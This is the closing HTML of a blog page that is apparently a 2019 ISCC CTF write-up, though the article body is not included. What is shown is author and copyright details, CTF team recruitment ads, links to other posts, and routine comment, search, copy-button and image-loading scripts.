is-multiline is-mobile"> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/wp/">#wp</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span></div><hr><blockquote class="colorquote info"><p>Article Author: Zeddy</p><p>Article Link: https://blog.zeddyu.info/2019/05/30/2019iscc/index.html</p><p>Copyright Notice: With the exception of the special statement at the beginning of the article, all articles can be reprinted in accordance with the CC BY 4.0 agreement with the author&#39;s permission.</p></blockquote><blockquote class="colorquote success"><p>Ad: I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: https://blog.zeddyu.info/advertisement/</p><p>Ad: 想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a href="https://blog.zeddyu.info/advertisement/#知识星球" target="_blank" rel="noopener">知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a href="https://blog.zeddyu.info/advertisement/#International-CTF-Team" target="_blank" rel="noopener">International CTF Team</a> 查看详情</p></blockquote><div class="columns is-mobile is-multiline article-nav"> <span class="column is-12-mobile is-half-desktop article-nav-prev"><a href="/2019/06/04/2019qwb/">2019强网杯部分Web wp</a></span> <span class="column is-12-mobile is-half-desktop article-nav-next"><a href="/2019/05/09/2019ciscn-RefSpace/">2019 CISCN RefSpace</a></span></div></article><div class="comments"><h3 class="title is-4">Comments</h3><script>function loadDisqus(){var e=document,n=e.createElement("script");n.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",l=e.createElement("link"),l.href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css",l.setAttribute("rel","stylesheet"),(e.head||e.body).appendChild(n),e.head.appendChild(l),n.onload=function(){new DisqusJS({shortname:"zeddyu",siteName:"blog.zeddyu.info",identifier:document.location.origin+document.location.pathname+document.location.search,url:document.location.origin+document.location.pathname+document.location.search,title:document.title,api:"https://blog.zeddyu.info/api/",apikey:"57m1j10pU1WfesAhs8Ri3OcmPEaRmoyIuNCPcYaUu6mqWu6Ek4qvRiQf9CXl2JoH",admin:"ZeddYu",adminLabel:""})}}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);setTimeout(function(){isBot||loadDisqus()},1)</script><div id="disqus_thread"></div></div></div></section><footer class="footer"><div class="container"><div class="columns content"><div class="column is-narrow has-text-centered"> &copy; 2021 Zedd&nbsp; Powered by <a href="http://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a></div><div class="column is-hidden-mobile"></div><div class="column is-narrow"><div class="columns is-mobile is-multiline is-centered"> <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener">GitHub</a> <a class="column is-narrow has-text-black" title="RSS" href="https://blog.zeddyu.info/atom.xml">RSS</a> <a class="column is-narrow has-text-black" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener">Twitter</a></div></div></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script><script>moment.locale("en-AU")</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script><style>.hljs{position:relative}.hljs .clipboard-btn{float:right;color:#9a9a9a;background:0 0;border:none;cursor:pointer}.hljs .clipboard-btn:hover{color:#8a8a8a}.hljs>.clipboard-btn{display:none;position:absolute;right:4px;top:4px}.hljs:hover>.clipboard-btn{display:inline}.hljs>figcaption>.clipboard-btn{margin-right:4px}</style><script>$(document).ready(function(){$("figure.hljs").each(function(t,e){var a="code-"+t,r=e.querySelector(".code"),c=$('<button>Copy <i class="far fa-clipboard"></i></button>');r.id=a,c.addClass("clipboard-btn"),c.attr("data-clipboard-target-id",a);var n=e.querySelector("figcaption");n?n.append(c[0]):e.prepend(c[0])}),new ClipboardJS(".clipboard-btn",{target:function(t){return document.getElementById(t.getAttribute("data-clipboard-target-id"))}}).on("success",function(t){t.clearSelection()})})</script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/script.js"></script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/insight.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1740444562387978" crossorigin="anonymous"></script><div class="searchbox ins-search"><div class="searchbox-mask"></div><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"> <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},CONTENT_URL:"/content.json"}</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html>